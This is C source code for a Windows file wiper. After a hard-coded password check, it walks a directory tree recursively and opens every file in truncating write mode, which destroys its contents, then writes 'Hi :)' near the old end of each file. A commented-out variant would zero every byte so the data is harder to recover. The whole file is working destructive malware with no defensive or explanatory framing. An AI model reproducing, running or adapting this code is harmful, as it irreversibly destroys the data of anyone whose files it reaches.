#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <wchar.h>
#include <io.h>

u_long FileSizeByName(wchar_t *sFileName)
{
	FILE *fp = NULL;
#ifdef _DEBUG
	wprintf_s(L"sFileName is: %s\n", sFileName);
#endif 
	if(_wfopen_s(&fp, sFileName, L"r")!=0)
	{
#ifdef _DEBUG
		wprintf_s(L"Error opening file for READING: %s\n", sFileName);
#endif
		return 1;
	}
	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = (HANDLE)_get_osfhandle(_fileno(fp)); // get handle associated with specific file descriptor (get file descriptor from stream)
	u_long  iFileSize = 0;
	iFileSize = GetFileSize(hFile, NULL);
	fclose(fp);
#ifndef _DEBUG
	CloseHandle(hFile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
#endif 
#ifdef _DEBUG
	wprintf_s(L"File Size: %d\r\n", iFileSize);
#endif
	return iFileSize;
}

int corrupt(wchar_t *sTarget)
{
	u_long iFileSize = FileSizeByName(sTarget);
#ifdef _DEBUG
	wprintf_s(L"iFileSize is : %d\n", iFileSize);
#endif
	FILE *fp = NULL;
	if(_wfopen_s(&fp, sTarget, L"w+")!=0)
	{
#ifdef _DEBUG
		wprintf_s(L"Error opening file for WRITING: %s\n", sTarget);
#endif
		return 1;
	}

	/*
	char buffer[1024 * 64] = {0};
	fwrite(buffer, 1, sizeof(buffer), fp);
	*/
	fseek ( fp , iFileSize-5, SEEK_SET ); // 5 bytes for the friendly salutation :>
	fputs("Hi :)",fp);

	/*// this method will prevent the OS from creating sparse files, and will be harder to recover overwritten data. 
	for (u_long i=0 ; i < iFileSize ; i++)
	{
	fseek ( fp , i, SEEK_SET );
	fputs("\x00",fp);
	}
	*/
	fclose(fp);
	return 0;
}

int ListDirectoryContents(const wchar_t *sDir)
{ 
	WIN32_FIND_DATA FindFileData ={0};
	HANDLE hFind = INVALID_HANDLE_VALUE; 
	wchar_t sPath[MAX_PATH] = {0}; 

	wcscpy_s(sPath, MAX_PATH, sDir); 
	wcscat_s(sPath, MAX_PATH, L"\\*"); 

	hFind = FindFirstFile(sPath, &FindFileData);
	if(INVALID_HANDLE_VALUE == hFind )
	{ 
		wprintf_s(L"Path not found: [%s]\n", sDir); 
		return 1; 
	} 

	do
	{ 
		if(wcscmp(FindFileData.cFileName, L".") != 0 && wcscmp(FindFileData.cFileName, L"..") != 0) // remove `.` & `..`
		{ 
			wsprintf(sPath, L"%s\\%s", sDir, FindFileData.cFileName); 
			//StringCbPrintf(sPath,MAX_PATH, L"%s\\%s", sDir, FindFileData.cFileName);
			//Is the entity a File or Folder? 
			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{ 
				wprintf_s(L"Directory: %s\n", sPath); 
				ListDirectoryContents(sPath); //Recursion, we love it! 
			} 
			else{ 
				wprintf_s(L"File: %s\n", sPath); 
				corrupt(sPath);
			} 
		}
	} 
	while(FindNextFile(hFind, &FindFileData)); //Find the next file. 
	FindClose(hFind); //Always, Always, clean things up! 
	return 0; 
} 

//int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int iCmdShow)
int _tmain(int argc, TCHAR *argv[])
{
	wchar_t cUserInput[16]={0};
	wprintf_s(L"Password:\n");
	fgetws(cUserInput, sizeof(cUserInput), stdin);
	wprintf_s(L"Password is: %s\n", cUserInput);
	int i = wcscmp(cUserInput,L"test123\n");
	if(i!=0)
	{
		wprintf_s(L"\nBad password!\n");
		exit(1);
	};

	wchar_t cDstDir[MAX_PATH] = {0};
	if(argc != 2)
	{
		GetCurrentDirectory(MAX_PATH, cDstDir);
		//StringCchCopy(cDstDir, MAX_PATH, TEXT("c:"));
	}
	else
	{
		wcscpy_s(cDstDir, MAX_PATH, argv[1]);
	}
	wprintf_s(L"cDstDir is:\t%s\n", cDstDir);
	ListDirectoryContents(cDstDir);
	return 0;
}